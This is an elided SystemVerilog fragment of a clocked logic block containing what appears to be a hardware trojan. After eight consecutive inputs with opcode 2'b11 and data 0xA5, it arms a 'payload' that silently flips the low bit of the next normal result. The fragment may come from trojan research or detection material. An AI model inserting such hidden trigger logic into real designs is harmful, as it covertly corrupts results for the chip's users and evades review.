    ...
    always_ff @(posedge clk or negedge rst_n) begin
        if (!rst_n) begin
            ...
            if (valid_i) begin
                ...
                if ((opcode_i == 2'b11) && (data_i == 8'hA5)) begin
                    if (trigger_count == 4'd7) begin
                        trigger_count <= 4'h0;
                        payload_armed <= 1'b1;
                    end else begin
                        trigger_count <= trigger_count + 4'd1;
                    end
                end else begin
                    trigger_count <= 4'h0;

                    if (payload_armed) begin
                        data_o <= normal_result(opcode_i, data_i) ^ 8'h01;
                        payload_armed <= 1'b0;
                    end
                end
            end
